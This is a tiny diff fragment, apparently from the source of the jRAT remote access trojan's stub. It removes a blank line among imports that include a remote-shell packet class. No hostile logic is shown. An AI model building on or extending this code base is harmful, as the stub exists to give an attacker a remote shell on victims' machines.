@@ -1,7 +1,6 @@
 package io.jrat.stub;
 
 import io.jrat.stub.packets.outgoing.Packet21RemoteShell;
-
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
